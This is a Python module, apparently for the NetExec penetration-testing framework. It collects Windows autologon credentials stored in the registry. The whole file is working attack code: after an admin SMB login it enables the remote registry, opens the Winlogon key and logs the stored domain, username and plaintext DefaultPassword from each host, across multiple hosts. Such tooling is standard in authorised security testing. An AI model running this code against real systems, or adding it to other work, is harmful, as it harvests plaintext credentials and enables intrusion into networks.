from impacket.dcerpc.v5 import rrp
from impacket.examples.secretsdump import RemoteOperations

class NXCModule:
    r"""
    WinLogon AutoLogon: extract the credential from the following registry hive
    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    Module by @pentest_swissky
    """

    name = "reg-winlogon"
    description = "Collect autologon credential stored in the registry"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options

    def options(self, context, module_options):
        """ """

    def on_admin_login(self, context, connection):
        remoteOps = RemoteOperations(connection.conn, False)
        remoteOps.enableRegistry()

        ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
        regHandle = ans["phKey"]
        ans = rrp.hBaseRegOpenKey(
            remoteOps._RemoteOperations__rrp,
            regHandle,
            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        )
        keyHandle = ans["phkResult"]
        
        reg_keys = ["AutoAdminLogon", "DefaultDomainName", "DefaultUserName", "DefaultPassword"]
        for reg_key in reg_keys:
            try:
                dataType, reg_value = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, reg_key)
                context.log.highlight(f"{reg_key}: {reg_value}")
            except Exception:
                context.log.highlight(f"{reg_key}:")

        rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)
        remoteOps.finish()